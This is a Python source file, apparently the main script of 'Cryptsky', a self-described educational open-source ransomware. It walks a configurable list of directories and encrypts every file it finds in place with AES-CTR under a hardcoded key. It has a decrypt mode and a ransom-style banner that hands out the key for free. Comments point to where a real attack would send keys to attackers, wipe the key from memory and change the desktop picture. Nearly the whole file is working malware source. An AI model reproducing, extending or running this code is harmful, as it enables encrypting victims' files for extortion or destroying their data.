#!/usr/bin/env python
from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import argparse
import os
import random
import discover
import modify
from subprocess import call

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = 'yellow submarine'


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
Cryptsky!
---------------
Your files have been encrypted. This is normally the part where I would
tell you to pay a ransom, and I will send you the decryption key. However, this
is an open source project to show how easy malware can be to write and to allow
others to view what may be one of the first fully open source python ransomwares.

This project does not aim to be malicious. The decryption key can be found
below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
your files forever. Do not include the surrounding quotes, but do make sure
to match case, special characters, and anything else EXACTLY!
Happy decrypting and be more careful next time!

Your decryption key is: %s
''' % HARDCODED_KEY)
        key = input('Enter Your Key> ')

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        # maybe I'll do that later. but for now, this will do.
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = ['C:\\CryptMe']

    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            # os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    ''' # Taken out for Case Studies
    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        key = random(32)
        pass
    '''

    if not decrypt:
        pass
         # post encrypt stuff
         # desktop picture
         # icon, etc


if __name__=="__main__":
    main()
